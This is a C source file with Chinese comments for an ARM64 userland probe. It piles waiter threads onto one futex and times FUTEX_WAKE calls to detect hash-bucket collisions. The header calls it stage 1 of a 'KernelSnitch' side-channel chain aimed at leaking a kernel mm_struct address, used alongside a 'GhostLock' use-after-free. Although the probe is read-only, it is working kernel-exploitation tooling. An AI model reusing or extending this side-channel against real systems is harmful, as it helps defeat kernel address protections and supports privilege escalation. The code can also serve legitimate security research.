/*
 * collision_probe.c — KernelSnitch 阶段1 碰撞观测（纯用户态，只读探针）
 *
 * 安全边界（严格遵守）：
 *   - 只用 mmap + futex(FUTEX_WAIT_PRIVATE / FUTEX_WAKE_PRIVATE) + cntvct_el0 计时
 *   - 不触发 GhostLock UAF、不写内核、不碰 /proc、不做持久化
 *   - FUTEX_WAIT 全部带 1 秒超时，线程不会永久挂起
 *   - 这是 PCKM00 项目 __increase + __measure 的缩小版（线程数降低）
 *
 * 目的：验证本机上 futex 哈希桶碰撞是否产生可区分的时序信号（10× 阈值）。
 * 若成立，则 KernelSnitch 阶段1 在本机可用，配合方向A已证的阶段2 闭环即可得 mm_struct 地址。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <time.h>
#include <inttypes.h>

#define PAGE 4096
#define NR_FUTEX_PAGES 4096          /* 16 MB futex 区 */
#define WAITERS 256                  /* 堆积线程数（PCKM00 用 4096，这里缩小） */
#define SAMPLE_CANDIDATES 512        /* 探测的候选 futex 地址数 */
#define REPEAT 32                    /* 每地址重复测量次数 */
#define AVERAGE_N 8                  /* 取最快 N 次平均 */

static volatile uint32_t *futex_base;
static volatile uint32_t *target_futex;   /* 堆积目标 */
static volatile int go_stop = 0;

static inline uint64_t rdtsc(void) {
    uint64_t v;
    __asm__ volatile("isb" ::: "memory");
    __asm__ volatile("mrs %0, cntvct_el0" : "=r"(v));
    __asm__ volatile("isb" ::: "memory");
    return v;
}

static int futex_op(uint32_t *uaddr, int op, uint32_t val, const struct timespec *to) {
    return (int)syscall(SYS_futex, uaddr, op, val, to, NULL, 0);
}

/* 堆积线程：在 target_futex 上 FUTEX_WAIT_PRIVATE，带 2 秒超时 */
static void *waiter_thread(void *arg) {
    (void)arg;
    struct timespec ts = { .tv_sec = 2, .tv_nsec = 0 };
    while (!go_stop) {
        futex_op((uint32_t *)target_futex, FUTEX_WAIT_PRIVATE,
                 *target_futex, &ts);
        usleep(1000);
    }
    return NULL;
}

/* 测量对某 futex 地址做一次 WAKE 的耗时（取 AVERAGE_N 个最快样本） */
static uint64_t measure(uint32_t *addr) {
    uint64_t samples[REPEAT];
    for (int i = 0; i < REPEAT; i++) {
        uint64_t t0 = rdtsc();
        futex_op(addr, FUTEX_WAKE_PRIVATE, 1, NULL);
        uint64_t t1 = rdtsc();
        samples[i] = t1 - t0;
    }
    /* 简单选择排序取前 AVERAGE_N 小 */
    for (int i = 0; i < REPEAT; i++)
        for (int j = i + 1; j < REPEAT; j++)
            if (samples[j] < samples[i]) { uint64_t x=samples[i]; samples[i]=samples[j]; samples[j]=x; }
    uint64_t sum = 0;
    for (int i = 0; i < AVERAGE_N; i++) sum += samples[i];
    return sum / AVERAGE_N;
}

int main(void) {
    printf("=== collision_probe (userland futex timing, read-only) ===\n");
    fflush(stdout);

    uint64_t frq;
    __asm__ volatile("mrs %0, cntfrq_el0" : "=r"(frq));
    printf("cntfrq_el0 = %" PRIu64 " Hz\n", frq);
    fflush(stdout);

    /* 分配 futex 区 */
    size_t map_sz = (size_t)NR_FUTEX_PAGES * PAGE;
    futex_base = mmap(NULL, map_sz, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (futex_base == MAP_FAILED) { perror("mmap"); return 2; }
    memset((void *)futex_base, 0, map_sz);
    printf("mmap futex area = %zu bytes OK\n", map_sz);
    fflush(stdout);

    /* 目标 futex：选页内 offset 128（模拟 PCKM00 的 ID 128） */
    target_futex = (volatile uint32_t *)((char *)futex_base + 128);
    *target_futex = 0;

    /* 基线：测若干"空桶"地址（远离 target 的地址） */
    uint64_t baseline = 0;
    int nb = 0;
    for (int i = 1; i <= 16; i++) {
        uint32_t *addr = (uint32_t *)((char *)futex_base + (size_t)i * PAGE + 128);
        baseline += measure(addr);
        nb++;
    }
    baseline /= nb;
    printf("baseline (empty buckets) avg ticks = %" PRIu64 "\n", baseline);
    fflush(stdout);

    /* 堆积：起 WAITERS 个线程睡在 target_futex 上，使其 hash bucket 变长 */
    printf("spawning %d waiter threads on target bucket...\n", WAITERS);
    fflush(stdout);
    pthread_t tids[WAITERS];
    for (int i = 0; i < WAITERS; i++) {
        if (pthread_create(&tids[i], NULL, waiter_thread, NULL) != 0) {
            printf("pthread_create failed at %d\n", i);
            go_stop = 1;
            for (int k = 0; k < i; k++) pthread_join(tids[k], NULL);
            munmap((void *)futex_base, map_sz);
            return 3;
        }
    }
    usleep(300000);  /* 0.3s 让线程进入 WAIT */
    printf("waiters settled.\n");
    fflush(stdout);

    /* 探测：测 target 自身 + 一批候选地址的 wake 耗时 */
    uint64_t target_time = measure((uint32_t *)target_futex);
    printf("target bucket wake ticks = %" PRIu64 " (ratio vs baseline = %.2f)\n",
           target_time, (double)target_time / (double)(baseline ? baseline : 1));
    fflush(stdout);

    int collisions = 0;
    uint64_t max_other = 0;
    for (int i = 0; i < SAMPLE_CANDIDATES; i++) {
        /* 候选地址：跨整个映射区，步长一页 */
        uint32_t *addr = (uint32_t *)((char *)futex_base
                        + (size_t)((i * 7919) % NR_FUTEX_PAGES) * PAGE + 128);
        if (addr == (uint32_t *)target_futex) continue;
        uint64_t t = measure(addr);
        if (t > max_other) max_other = t;
        if (baseline && t > baseline * 10) {
            collisions++;
            if (collisions <= 10)
                printf("  COLLISION candidate[%d] addr=%p ticks=%" PRIu64 "\n",
                       i, (void *)addr, t);
        }
    }

    printf("\n=== results ===\n");
    printf("baseline=%" PRIu64 "  target=%" PRIu64 "  max_other=%" PRIu64 "\n",
           baseline, target_time, max_other);
    printf("collisions found (t > 10x baseline) = %d / %d\n", collisions, SAMPLE_CANDIDATES);
    if (target_time > baseline * 10)
        printf("VERDICT: target bucket clearly distinguishable => futex hash timing side-channel WORKS.\n");
    else
        printf("VERDICT: target bucket NOT distinguishable at 10x threshold => side-channel weak/absent.\n");

    /* 清理：停线程、解除映射 */
    go_stop = 1;
    futex_op((uint32_t *)target_futex, FUTEX_WAKE_PRIVATE, INT32_MAX, NULL);
    for (int i = 0; i < WAITERS; i++) pthread_join(tids[i], NULL);
    munmap((void *)futex_base, map_sz);
    printf("cleanup done. no kernel state touched.\n");
    return 0;
}
